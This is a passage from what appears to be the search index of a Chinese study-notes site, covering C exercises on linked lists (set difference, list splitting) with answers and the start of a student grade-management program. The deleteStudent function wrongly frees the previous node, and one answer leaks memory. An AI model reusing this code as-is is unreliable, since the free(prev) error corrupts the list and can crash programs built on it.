// \u91ca\u653e\u7ed3\u70b9\u7684\u5185\u5b58\u7a7a\u95f4\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_44","title":"\u4e24\u4e2a\u94fe\u8868\u7684\u5dee\u96c6","text":"<p>\u5df2\u77e5\u4e24\u4e2a\u94fe\u8868 A \u548c B \u5206\u522b\u8868\u793a\u4e24\u4e2a\u96c6\u5408\uff0c\u5176\u5143\u7d20\u9012\u589e\u6392\u5217\u3002\u8bf7\u8bbe\u8ba1\u7b97\u6cd5\u6c42\u51fa\u4e24\u4e2a\u96c6\u5408 A \u548c B \u7684\u5dee\u96c6\uff08\u5373\u4ec5\u7531\u5728 A \u4e2d\u51fa\u73b0\u800c\u4e0d\u5728 B \u4e2d\u51fa\u73b0\u7684\u5143\u7d20\u6240\u6784\u6210\u7684\u96c6\u5408\uff09\uff0c\u5e76\u4ee5\u540c\u6837\u7684\u5f62\u5f0f\u5b58\u50a8\uff0c\u540c\u65f6\u8fd4\u56de\u8be5\u96c6\u5408\u7684\u5143\u7d20\u4e2a\u6570\u3002</p> <p>\u6ce8\u610f\uff1a\u4e24\u4e2a\u94fe\u8868\u4e00\u6837\u65f6\uff0c\u8f93\u51fa\u4e3a\u7a7a\uff0c\u5373\u4ec0\u4e48\u4e5f\u4e0d\u8f93\u51fa\u3002</p> <p>\u8f93\u5165</p> Text Only<pre><code>3,3\uff08\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n1\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n2\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 1 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n3\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n4\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n5\uff08\u7b2c 2 \u4e2a\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u6c42\u5dee\u96c6\u540e\u7684\u7684\u7ed3\u679c\u4e3a\uff1a12\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_45","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid Difference_Set(LinkList *La, LinkList *Lb, LinkList *Lc) {\n    // \u6c42\u4e24\u4e2a\u94fe\u8868\u7684\u5dee\u96c6\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    // \u521b\u5efa2\u4e2a\u94fe\u8868\n    LinkList La, Lb, Lc;\n\n    // \u8f93\u5165\u6570\u636e\n    int sum01, sum02;\n    printf(\"\u4e24\u4e2a\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5206\u522b\u4e3a\uff1a\");\n    scanf(\"%d,%d\", &amp;sum01, &amp;sum02); // \u8f93\u5165\u4ee5\u9017\u53f7\u5206\u9694\u5f00\n    printf(\"\u8bf7\u8f93\u5165\u7b2c1\u4e2a\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;La, sum01);\n    printf(\"\u8bf7\u8f93\u5165\u7b2c2\u4e2a\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;Lb, sum02);\n\n    Difference_Set(&amp;La, &amp;Lb, &amp;Lc);\n    printf(\"\\n\u6c42\u5dee\u96c6\u540e\u7684\u7ed3\u679c\u4e3a\uff1a\");\n    print_LinkList(La);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_46","title":"\u7b54\u6848\uff1a","text":"<p>\u8fd9\u4e2a\u9898\u597d\u50cf\u4e5f\u662f\u6709\u95ee\u9898\uff0c\u4e3b\u51fd\u6570\u91cc\u6700\u540e\u662f\u7528\u7684<code>print_LinkList(La);</code>\uff0c\u4e0d\u5e94\u8be5\u662f\u7528<code>Lc</code>\u5e26\u56de\u6765\u503c\uff0c\u7136\u540e<code>print_LinkList(Lc);</code>\u5417\u3002\u4e0d\u7ba1\u4e86\uff0c\u8fd9\u513f\u6211\u5c31\u7528<code>Lc</code>\u4e86\u3002</p> <p>Alpha\u63d0\u4ea4\u7684\u65f6\u5019\u6539\u4e00\u4e0b\u4e3b\u51fd\u6570\uff0c\u6539\u6210<code>Lc</code>\u5c31\u884c\u3002\uff08\u540e\u6765\u53d1\u73b0\uff0c<code>La</code>\u4e5f\u884c\uff0c\u90fd\u80fd\u8fc7\u68c0\u67e5\uff09</p> <p>\u4f9d\u65e7\u662f<code>Create_LinkList</code>\u7684\u4e8c\u91cd\u6307\u9488\uff0c<code>print_LinkList</code>\uff0c\u751a\u81f3\u76f4\u63a5\u7528\u4e0a\u4e00\u9898\u7684\u4ee3\u7801\u90fd\u884c\u3002</p> <p>\u6240\u4ee5\u8fd9\u4e00\u9898\u7684\u91cd\u70b9\u5c31\u662f<code>Difference_Set</code>\u3002</p> <p>\u521a\u5f00\u59cb\u7684\u65f6\u5019\u5fd8\u4e86<code>Lc</code>\u6ca1\u6709\u521d\u59cb\u5316\u4e86\uff0c<code>Lc</code>\u5728<code>Difference_Set</code>\u4e2d\u8981\u521d\u59cb\u5316\u4e00\u4e0b\u3002</p> <p>\u8fd9\u4e2a\u9898\u7684\u7b54\u6848\u7528\u6807\u51c6\u7b54\u6848\uff0c\u56e0\u4e3a\u6807\u51c6\u7b54\u6848\u786e\u5b9e\u662f\u7528<code>La</code>\u7684\u3002</p> C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LNode*)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n\n    LinkList p = *L;\n\n    for (int i = 0; i &lt; n; i++) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        scanf(\"%d\", &amp;(newNode-&gt;data));\n        newNode-&gt;next = NULL;\n        p-&gt;next = newNode;\n        p = p-&gt;next;\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList temp = L-&gt;next;\n    while (temp != NULL) {\n        printf(\"%d\", temp-&gt;data);\n        temp = temp-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\nvoid Difference_Set(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pA = (*La)-&gt;next;\n    LinkList pB = (*Lb)-&gt;next;\n\n    *Lc = (LNode*)malloc(sizeof(LNode));\n    (*Lc)-&gt;next = NULL;\n    LinkList pC = *Lc;\n\n\n    while (pA != NULL &amp;&amp; pB != NULL) {\n        if (pA-&gt;data &lt; pB-&gt;data) {\n            LinkList newNode = (LinkList)malloc(sizeof(LNode));\n            newNode-&gt;data = pA-&gt;data;\n            newNode-&gt;next = NULL;\n            pC-&gt;next = newNode;\n            pC = pC-&gt;next;\n            pA = pA-&gt;next;\n        }\n        else if (pA-&gt;data &gt; pB-&gt;data) {\n            pB = pB-&gt;next;\n        }\n        else {\n            pA = pA-&gt;next;\n            pB = pB-&gt;next;\n        }\n    }\n\n    while (pA != NULL) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        newNode-&gt;data = pA-&gt;data;\n        newNode-&gt;next = NULL;\n        pC-&gt;next = newNode;\n        pC = pC-&gt;next;\n        pA = pA-&gt;next;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#nice","title":"\u6807\u51c6\u7b54\u6848\uff08Nice\uff09","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;     // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c%2d\u4e2a\u5143\u7d20\u662f\uff1a\", i + 1);  // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;p-&gt;data);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next;  // \u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d\", p-&gt;data);\n    }\n}\n\nvoid Difference_Set(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pa = (*La)-&gt;next;\n    LinkList pb = (*Lb)-&gt;next;\n    LinkList pc = *Lc = *La;\n    while (pa &amp;&amp; pb) {\n        if (pa-&gt;data &lt; pb-&gt;data) {\n            pc = pa;\n            pa = pa-&gt;next;\n        }\n        else if (pa-&gt;data &gt; pb-&gt;data) {\n            pb = pb-&gt;next;\n        }\n        else if (pa-&gt;data == pb-&gt;data) {\n            pc-&gt;next = pa-&gt;next;\n            free(pa);\n            pa = pc-&gt;next;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_47","title":"\u5206\u89e3\u94fe\u8868","text":"<p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u5c06\u4e00\u4e2a\u5e26\u5934\u7ed3\u70b9\u7684\u5355\u94fe\u8868 A \u5206\u89e3\u4e3a\u4e24\u4e2a\u5177\u6709\u76f8\u540c\u7ed3\u6784\u7684\u94fe\u8868 B \u548c C\uff0c\u5176\u4e2d B \u8868\u7684\u7ed3\u70b9\u4e3a A \u8868\u4e2d\u503c\u5c0f\u4e8e\u96f6\u7684\u7ed3\u70b9\uff0c\u800c C \u8868\u7684\u7ed3\u70b9\u4e3a A \u8868\u4e2d\u503c\u5927\u4e8e\u96f6\u7684\u7ed3\u70b9(\u94fe\u8868 A \u4e2d\u7684\u5143\u7d20\u4e3a\u975e\u96f6\u6574\u6570\uff0c\u8981\u6c42 B\u3001C \u8868\u5229\u7528 A \u8868\u7684\u7ed3\u70b9)\u3002</p> <p>\u6ce8\u610f\uff1a\u521b\u5efa\u94fe\u8868 A \u65f6\uff0c\u5982\u679c\u8f93\u5165 0\uff0c\u7a0b\u5e8f\u4f1a\u5c06 0 \u5728\u7ed3\u679c\u4e2d\u5220\u9664\u3002</p> <p>\u8f93\u5165</p> Text Only<pre><code>4\uff08A\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\uff09\n-2\uff08A\u94fe\u8868\u7684\u7b2c 1 \u4e2a\u5143\u7d20\uff09\n-1\uff08A\u94fe\u8868\u7684\u7b2c 2 \u4e2a\u5143\u7d20\uff09\n1\uff08A\u94fe\u8868\u7684\u7b2c 3 \u4e2a\u5143\u7d20\uff09\n2\uff08A\u94fe\u8868\u7684\u7b2c 4 \u4e2a\u5143\u7d20\uff09\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>B(\u5b58\u50a8\u8d1f\u6570)\u3001C\uff08\u5b58\u50a8\u6b63\u6570\uff09\u94fe\u8868\u5206\u522b\u4e3a\uff1a\n-1 -2\n2 1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_48","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct LNode {\n    int data;\n    struct LNode *next;\n} LNode, *LinkList;\n\nvoid Create_LinkList(LinkList *L, int n) {\n    // \u521b\u5efa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid print_LinkList(LinkList L) {\n    // \u8f93\u51fa\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Split_List(LinkList *La, LinkList *Lb, LinkList *Lc) {\n    // \u5c06A\u94fe\u8868\u5206\u89e3\u6210B\u3001C\u4e24\u4e2a\u94fe\u8868\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    // \u521b\u5efa\u94fe\u8868\n    LinkList La, Lb, Lc;\n\n    // \u8f93\u5165\u6570\u636e\n    int sum;\n    printf(\"A\u94fe\u8868\u7684\u5143\u7d20\u4e2a\u6570\u4e3a\uff1a\");\n    scanf(\"%d\", &amp;sum);\n    printf(\"\\n\u8bf7\u8f93\u5165A\u94fe\u8868\u7684\u6570\u636e\uff1a\\n\");\n    Create_LinkList(&amp;La, sum);\n\n    Split_List(&amp;La, &amp;Lb, &amp;Lc);\n    printf(\"\\nB(\u5b58\u50a8\u8d1f\u6570)\u3001C\uff08\u5b58\u50a8\u6b63\u6570\uff09\u94fe\u8868\u5206\u522b\u4e3a\uff1a\\n\");\n    print_LinkList(Lb);\n    printf(\"\\n\");\n    print_LinkList(Lc);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_49","title":"\u7b54\u6848\uff1a","text":"<p>\u4f9d\u65e7\u662f<code>Create_LinkList</code>\u7684\u4e8c\u91cd\u6307\u9488\uff0c<code>print_LinkList</code>\uff0c\u751a\u81f3\u76f4\u63a5\u7528\u4e0a\u4e00\u9898\u7684\u4ee3\u7801\u90fd\u884c\u3002 \u6240\u4ee5\u8fd9\u4e00\u9898\u7684\u91cd\u70b9\u5c31\u662f<code>Split_List</code>\u3002</p> <p>\u8fd9\u90e8\u5206\u548c\u7b2c\u4e00\u9898\u201c\u5355\u94fe\u8868\u7684\u5408\u5e76\u201d\u4e00\u6837\uff0c\u53ef\u4ee5\u76f4\u63a5\u5934\u63d2\uff0c\u4e5f\u53ef\u4ee5\u5c3e\u63d2+\u9006\u8f6c</p>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_50","title":"\u65b9\u6cd5\u4e00\uff1a\u76f4\u63a5\u5934\u63d2","text":"<p>\u8fd9\u591a\u7b80\u5355\uff0c\u5c3e\u63d2+\u9006\u8f6c\u592a\u7e41\u7410\u4e86</p> C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LNode*)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n\n    LinkList p = *L;\n\n    for (int i = 0; i &lt; n; i++) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        scanf(\"%d\", &amp;(newNode-&gt;data));\n\n        if ((newNode-&gt;data) != 0) {\n            // \u9898\u76ee\u8981\u6c42\uff0c\u5982\u679c\u8f93\u5165 0\uff0c\u7a0b\u5e8f\u4f1a\u5c06 0 \u5728\u7ed3\u679c\u4e2d\u5220\u9664\n            newNode-&gt;next = NULL;\n            p-&gt;next = newNode;\n            p = p-&gt;next;\n        }\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList temp = L-&gt;next;\n    while (temp != NULL) {\n        printf(\"%d \", temp-&gt;data);\n        temp = temp-&gt;next;\n    }\n}\n\nvoid Split_List(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pA = (*La)-&gt;next;\n    LinkList pB = NULL;\n    LinkList pC = NULL;\n\n    LinkList temp = (LinkList)malloc(sizeof(LNode));\n    temp-&gt;next = NULL;\n\n    *Lb = (LNode*)malloc(sizeof(LNode));\n    (*Lb)-&gt;next = NULL;\n    pB = *Lb;\n\n    *Lc = (LNode*)malloc(sizeof(LNode));\n    (*Lc)-&gt;next = NULL;\n    pC = *Lc;\n\n    while (pA != NULL) {\n        if (pA-&gt;data &lt; 0) {\n            temp = pA-&gt;next;\n            pA-&gt;next = pB-&gt;next;\n            pB-&gt;next = pA;\n            pA = temp;\n        }\n        else {\n            temp = pA-&gt;next;\n            pA-&gt;next = pC-&gt;next;\n            pC-&gt;next = pA;\n            pA = temp;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_51","title":"\u65b9\u6cd5\u4e8c\uff1a\u5c3e\u63d2+\u9006\u8f6c","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LNode*)malloc(sizeof(LNode));\n    (*L)-&gt;next = NULL;\n\n    LinkList p = *L;\n\n    for ( int i = 0; i &lt; n; i++) {\n        LinkList newNode = (LinkList)malloc(sizeof(LNode));\n        scanf(\"%d\", &amp;(newNode-&gt;data));\n\n        if ((newNode-&gt;data) != 0) {\n            // \u9898\u76ee\u8981\u6c42\uff0c\u5982\u679c\u8f93\u5165 0\uff0c\u7a0b\u5e8f\u4f1a\u5c06 0 \u5728\u7ed3\u679c\u4e2d\u5220\u9664\n            newNode-&gt;next = NULL;\n            p-&gt;next = newNode;\n            p = p-&gt;next;\n        }\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList temp = L-&gt;next;\n    while (temp != NULL) {\n        printf(\"%d \", temp-&gt;data);\n        temp = temp-&gt;next;\n    }\n}\n\nvoid Split_List(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    LinkList pA = (*La)-&gt;next;\n    LinkList pB = NULL;\n    LinkList pC = NULL;\n\n    *Lb = (LNode*)malloc(sizeof(LNode));\n    (*Lb)-&gt;next = NULL;\n    pB = *Lb;\n\n    *Lc = (LNode*)malloc(sizeof(LNode));\n    (*Lc)-&gt;next = NULL;\n    pC = *Lc;\n\n    while (pA != NULL) {\n        if (pA-&gt;data &lt; 0) {\n            LinkList newNode = (LinkList)malloc(sizeof(LNode));\n            newNode-&gt;data = pA-&gt;data;\n            newNode-&gt;next = NULL;\n            pB-&gt;next = newNode;\n            pB = pB-&gt;next;\n        }\n        else {\n            LinkList newNode = (LinkList)malloc(sizeof(LNode));\n            newNode-&gt;data = pA-&gt;data;\n            newNode-&gt;next = NULL;\n            pC-&gt;next = newNode;\n            pC = pC-&gt;next;\n        }\n        pA = pA-&gt;next;\n    }\n\n    // \u9006\u8f6c\u94fe\u8868B\n    pB = *Lb;\n    LinkList prev = NULL;\n    LinkList curr = pB-&gt;next;\n    LinkList next;\n    while (curr) {\n        next = curr-&gt;next;\n        curr-&gt;next = prev;\n        prev = curr;\n        curr = next;\n    }\n    pB-&gt;next = prev;\n\n    // \u9006\u8f6c\u94fe\u8868C\n    pC = *Lc;\n    prev = NULL;\n    curr = pC-&gt;next;\n    while (curr) {\n        next = curr-&gt;next;\n        curr-&gt;next = prev;\n        prev = curr;\n        curr = next;\n    }\n    pC-&gt;next = prev;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#nice_1","title":"\u6807\u51c6\u7b54\u6848\uff08Nice\uff09","text":"C<pre><code>void Create_LinkList(LinkList* L, int n) {\n    *L = (LinkList)malloc(sizeof(LNode)); // \u521b\u5efa\u5934\u7ed3\u70b9\n    (*L)-&gt;next = NULL;\n    LinkList rear; // \u5c3e\u6307\u9488\n    rear = *L;     // \u6307\u5411\u5934\u7ed3\u70b9\n    for (int i = 0; i &lt; n; i++) {\n        LinkList p = (LinkList)malloc(sizeof(LNode)); // \u7ed9\u65b0\u7ed3\u70b9\u521b\u5efa\u7a7a\u95f4\n        p-&gt;next = NULL;\n        printf(\"\u5355\u94fe\u8868\u4e2d\u7b2c%2d\u4e2a\u5143\u7d20\u662f\uff1a\", i + 1);  // \u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\uff0c\u5f97\u52a01\n        scanf(\"%d\", &amp;p-&gt;data);\n        rear-&gt;next = p; // \u65b0\u7ed3\u70b9\u63d2\u5165\u94fe\u8868\u5c3e\u90e8\n        rear = p;       // rear\u6307\u5411\u65b0\u7684\u5c3e\u8282\u70b9\n    }\n}\n\nvoid print_LinkList(LinkList L) {\n    LinkList p = L;\n    while (p-&gt;next != NULL) {\n        p = p-&gt;next;  // \u8df3\u8fc7\u5934\u7ed3\u70b9\u8f93\u51fa\u4e0b\u4e00\u4e2a\u7ed3\u70b9\u4e2d\u5b58\u50a8\u7684\u6570\u503c\n        printf(\"%d \", p-&gt;data);\n    }\n}\n\nvoid Split_List(LinkList* La, LinkList* Lb, LinkList* Lc) {\n    // \u5c06A\u94fe\u8868\u5206\u89e3\u6210B\u3001C\u4e24\u4e2a\u94fe\u8868\n\n    LinkList pa = (*La)-&gt;next;\n    *Lb = (LinkList)malloc(sizeof(LNode));\n    *Lc = (LinkList)malloc(sizeof(LNode));\n    (*Lc)-&gt;next = NULL;\n    (*Lb)-&gt;next = NULL;  // \u94fe\u8868\u521d\u59cb\u5316\uff0c\u4e3a\u7a7a\n\n    while (pa != NULL) {\n        LinkList next = pa-&gt;next;\n        if (pa-&gt;data &lt; 0) {  // \u628a\u5c0f\u4e8e0\u7684\u6570\u653e\u5165B\u4e2d\n            pa-&gt;next = (*Lb)-&gt;next;\n            (*Lb)-&gt;next = pa;\n        }\n        else if (pa-&gt;data &gt; 0) {  // \u628a\u5927\u4e8e0\u7684\u6570\u653e\u5165C\u4e2d\n            pa-&gt;next = (*Lc)-&gt;next;\n            (*Lc)-&gt;next = pa;\n        }\n        pa = next;  // \u6307\u5411\u4e0b\u4e00\u4e2a\u5f85\u5904\u7406\u7684\u70b9\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Grade%20Management%20System/","title":"\u6210\u7ee9\u7ba1\u7406\u7cfb\u7edf","text":""},{"location":"DEC/Data-Structure/Grade%20Management%20System/#_2","title":"\u8bf4\u660e","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf\uff0c\u7531\u5355\u94fe\u8868\u5b9e\u73b0\uff0c\u5728\u201c\u6392\u540d\u5b66\u751f\u4fe1\u606f\u201d\u529f\u80fd\u4e2d\u4f7f\u7528\u7684\u53cc\u91cd\u6307\u9488\uff0c\u5728\u5bfc\u5165\u5bfc\u51fa\u6587\u4ef6\u4e2d\u4f7f\u7528\u6587\u4ef6\u6307\u9488\u8fdb\u884c\u4e86\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\u3002</p>"},{"location":"DEC/Data-Structure/Grade%20Management%20System/#_3","title":"\u529f\u80fd\u5982\u4e0b","text":"C<pre><code>********************************************\n************** \u5b66\u751f\u6210\u7ee9\u7ba1\u7406\u7cfb\u7edf ************\n**                                        **\n**             1: \u63d2\u5165\u5b66\u751f\u4fe1\u606f            **\n**             2: \u5220\u9664\u5b66\u751f\u4fe1\u606f            **\n**             3: \u67e5\u8be2\u5b66\u751f\u4fe1\u606f            **\n**             4: \u663e\u793a\u5b66\u751f\u4fe1\u606f            **\n**             5: \u6392\u540d\u5b66\u751f\u4fe1\u606f            **\n**             6: \u4fee\u6539\u5b66\u751f\u4fe1\u606f            **\n**             7: \u5bfc\u51fa\u4fe1\u606f\u81f3\u6587\u4ef6          **\n**             8: \u7531\u6587\u4ef6\u5bfc\u5165\u4fe1\u606f          **\n**             9: \u663e\u793a\u5c0f\u7ec4 LOGO          **\n**            10: \u9000\u51fa                    **\n**                                        **\n********************************************\n</code></pre>"},{"location":"DEC/Data-Structure/Grade%20Management%20System/#_4","title":"\u4ee3\u7801","text":"C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;windows.h&gt;\n\ntypedef struct Student {\n    char name[50];\n    char ID[20] = { 0 };\n    float score[4];\n    float sum;\n    struct Student* next;\n} Student;\n\n// \u5168\u5c40\u53d8\u91cf\uff0c\u6307\u5411\u94fe\u8868\u5934\u8282\u70b9\nStudent* head = NULL;\n\nint count = 0; // \u7edf\u8ba1\u6570\u91cf\n\n// \u63d2\u5165\u5b66\u751f\u4fe1\u606f\nvoid insertStudent() {\n    Student* newStudent = (Student*)malloc(sizeof(Student));\n    if (newStudent == NULL) {\n        printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\uff01\\a\\n\");\n        exit(1);\n    }\n\n    newStudent-&gt;sum = 0.0;\n\n    printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u59d3\u540d: \");\n    scanf(\"%s\", newStudent-&gt;name);\n\n    printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u5b66\u53f7: \");\n    scanf(\"%s\", newStudent-&gt;ID);\n\n    printf(\"\u8bf7\u4f9d\u6b21\u8f93\u5165\u5b66\u751f\u56db\u95e8\u8bfe\u7a0b\u6210\u7ee9: \");\n\n    for (int i = 0; i &lt; 4; i++) {\n        scanf(\"%f\", &amp;(newStudent-&gt;score[i]));\n        newStudent-&gt;sum += newStudent-&gt;score[i];\n    }\n    newStudent-&gt;next = NULL;\n\n    // \u5982\u679c\u94fe\u8868\u4e3a\u7a7a\uff0c\u5c06\u65b0\u8282\u70b9\u8bbe\u7f6e\u4e3a\u5934\u8282\u70b9\n    if (head == NULL) {\n        head = newStudent;\n    }\n    else {\n        // \u5426\u5219\uff0c\u904d\u5386\u94fe\u8868\u627e\u5230\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff0c\u5e76\u5c06\u65b0\u8282\u70b9\u63d2\u5165\u5230\u6700\u540e\n        Student* current = head;\n        while (current-&gt;next != NULL) {\n            current = current-&gt;next;\n        }\n        current-&gt;next = newStudent;\n    }\n\n    printf(\"\u5b66\u751f\u4fe1\u606f\u63d2\u5165\u6210\u529f\uff01\\n\");\n    count++;\n}\n\n// \u5220\u9664\u5b66\u751f\u4fe1\u606f\nvoid deleteStudent() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u6cd5\u5220\u9664\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    char studentID[20] = { 0 };\n    printf(\"\u8bf7\u8f93\u5165\u8981\u5220\u9664\u7684\u5b66\u751f\u5b66\u53f7: \");\n    scanf(\"%s\", studentID);\n\n    Student* current = head;\n    Student* prev = NULL;\n\n    // \u904d\u5386\u94fe\u8868\u67e5\u627e\u8981\u5220\u9664\u7684\u5b66\u751f\u8282\u70b9\n    while (current != NULL &amp;&amp; strcmp(current-&gt;ID, studentID) != 0) {\n        prev = current;\n        current = current-&gt;next;\n    }\n\n    // \u5982\u679c\u627e\u5230\u4e86\u8981\u5220\u9664\u7684\u5b66\u751f\u8282\u70b9\n    if (current != NULL) {\n        // \u5982\u679c\u8981\u5220\u9664\u7684\u5b66\u751f\u8282\u70b9\u662f\u5934\u8282\u70b9\n        if (prev == NULL) {\n            head = current-&gt;next;\n        }\n        else {\n            prev-&gt;next = current-&gt;next;\n        }\n        free(current);\n        free(prev);\n\n        printf(\"\u5b66\u751f\u4fe1\u606f\u5220\u9664\u6210\u529f\uff01\\n\");\n        count--;\n    }\n    else {\n        printf(\"\u672a\u627e\u5230\u5b66\u53f7\u4e3a%s\u7684\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\", studentID);\n    }\n}\n\n// \u67e5\u8be2\u5b66\u751f\u4fe1\u606f\nvoid queryStudent() {\n    if (head == NULL) {\n        printf(\"\u94fe\u8868\u4e3a\u7a7a\uff0c\u65e0\u5b66\u751f\u4fe1\u606f\uff01\\a\\n\");\n        return;\n    }\n\n    char studentID[20] = { 0 };\n    printf(\"\u8bf7\u8f93\u5165\u8981\u67e5\u8be2\u7684\u5b66\u751f\u5b66\u53f7: \");\n    scanf(\"%s\", studentID);\n\n    Student* current = head;\n\n    // \u904d\u5386\u94fe\u8868\u67e5\u627e\u8981\u67e5\u8be2\u7684\u5b66\u751f\u8282\u70b9\n    while (current != NULL &amp;&amp; strcmp(current-&gt;ID, studentID) != 0) {\n        current = current-&gt;next;\n    }\n\n    // \u5982\u679c\u627e\u5230\u4e86\u8981\u67e5\u8be2\u7684\u5b66\u751f\u8282\u70b9\n    if (current != NULL) {\n        printf(\"\\n\");\n        printf(\"\u5b66\u751f\u59d3\u540d: %s\\n\", current-&gt;name);\n        printf(\"\u5b66\u751f\u5b66\u53f7: %s\\n\", current-&gt;ID);\n        printf(\"\u5b66\u751f\u6210\u7ee9: \");\n\n        for (int i = 0; i &lt; 4; i++) {\n            printf(\"%.2f \", current-&gt;score[i]);\n        }\n        printf(\"\\n\");\n\n        printf(\"\u5b66\u751f\u603b\u6210\u7ee9: %.2f\\n\", current-&gt;sum);\n    }\n    else {\n        